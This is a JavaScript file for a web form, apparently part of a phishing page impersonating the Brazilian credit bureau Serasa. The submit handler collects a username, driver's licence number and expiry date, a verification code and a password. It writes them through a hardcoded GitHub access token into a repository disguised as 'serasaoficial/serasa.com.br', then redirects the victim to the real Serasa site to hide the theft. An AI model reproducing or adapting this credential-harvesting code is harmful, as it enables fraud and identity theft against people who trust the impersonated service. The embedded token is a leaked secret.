var sideBar = document.querySelector('.sideBar');
var menuLateral = document.querySelector('.menuLateral');

function abrirMenu() {
    // Garante que a sideBar está visível antes de animar
    sideBar.style.display = "flex";
    menuLateral.style.transform = "translateX(0)";
}

function fecharMenu() {
    // Anima primeiro e esconde depois
    menuLateral.style.transform = "translateX(-100%)";
    // Espera a animação terminar antes de esconder completamente
    setTimeout(() => {
        sideBar.style.display = "none";
    }, 300); // Tempo da transição no CSS (0.3s = 300ms)
}

// Adiciona máscara ao campo de CNH
document.getElementById('cnh').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, ''); // Remove caracteres não numéricos
    let formatted = value.match(/\d{1,4}/g); // Agrupa em blocos de 4
    if (formatted) {
        e.target.value = formatted.join('-');
    }
});

// Envia os dados do formulário para um repositório no GitHub
document.getElementById('cadastroForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    const formData = {
        username: document.getElementById('username').value,
        cnh: document.getElementById('cnh').value,
        cnhVenc: document.getElementById('cnhVenc').value,
        verificacao: document.getElementById('verificacao').value,
        senha: document.getElementById('senha').value,
    };

    // Configuração do GitHub
    const GITHUB_API_URL = 'https://api.github.com';
    const REPO_OWNER = 'serasaoficial'; // Substitua pelo nome do dono do repositório
    const REPO_NAME = 'serasa.com.br'; // Substitua pelo nome do repositório
    const FILE_PATH = 'dados/formulario.json'; // Caminho do arquivo no repositório
    const GITHUB_TOKEN = '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'; // Substitua pelo seu token de acesso pessoal

    try {
        // Obtém o conteúdo atual do arquivo no GitHub
        const getResponse = await fetch(`${GITHUB_API_URL}/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
            headers: {
                'Authorization': `Bearer ${GITHUB_TOKEN}`,
                'Accept': 'application/vnd.github.v3+json',
            },
        });

        let fileContent = [];
        let sha = null;

        if (getResponse.ok) {
            const fileData = await getResponse.json();
            fileContent = JSON.parse(atob(fileData.content)); // Decodifica o conteúdo atual
            sha = fileData.sha; // Obtém o SHA do arquivo existente
        }

        // Adiciona o novo registro
        fileContent.push(formData);

        // Atualiza ou cria o arquivo no repositório
        const putResponse = await fetch(`${GITHUB_API_URL}/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${GITHUB_TOKEN}`,
                'Content-Type': 'application/json',
                'Accept': 'application/vnd.github.v3+json',
            },
            body: JSON.stringify({
                message: 'Atualizando dados do formulário',
                content: btoa(JSON.stringify(fileContent, null, 2)), // Codifica o novo conteúdo em Base64
                sha: sha, // Inclui o SHA para editar o arquivo existente (se aplicável)
            }),
        });

        if (putResponse.ok) {
            alert('Dados salvos no GitHub com sucesso!');
            window.location.href = 'https://serasa.com.br'; // Redireciona após sucesso
        } else {
            const errorData = await putResponse.json();
            throw new Error(errorData.message || 'Erro ao atualizar o arquivo no GitHub');
        }
    } catch (error) {
        alert('Erro ao salvar dados no GitHub: ' + error.message);
    }
});
